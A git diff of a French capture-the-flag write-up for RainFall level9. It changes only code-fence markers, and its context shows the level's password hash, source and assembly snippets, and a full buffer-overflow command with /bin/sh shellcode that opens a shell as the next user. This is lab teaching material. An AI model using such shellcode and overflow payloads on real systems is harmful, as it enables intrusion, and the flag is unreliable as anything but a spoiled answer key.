@@ -3,7 +3,7 @@
 pass : `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
 
 ## Sources :
-```cpp=
+```cpp
 #include <string.h>
 
 class N {  // ebp+0x8
@@ -43,7 +43,7 @@ int		main(int ac, char **av)
 
 Pour faire l'exploit, on va passer par le seul point d'entrée qu'on a, c'est à dire `av[1]`.
 Aussi on voit dans l'assembleur que pour appeler `*d + *c`, il fait :
-```asm=
+```asm
 mov    eax,DWORD PTR [esp+0x10]
 mov    eax,DWORD PTR [eax]
 mov    edx,DWORD PTR [eax]
@@ -99,7 +99,7 @@ Super !! Un prompt s'est affiché ! Il reste plus qu'à lancer ça en dehors de 
 
 ## Exploit :
 
-```shell=
+```shell
 level9@RainFall:~$ ./level9 $(perl -e 'print "\x10\xa0\x04\x08"."\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "\x90"x(108-28 -4) . "\x0c\xa0\x04\x08"')
 $ whoami
 bonus0
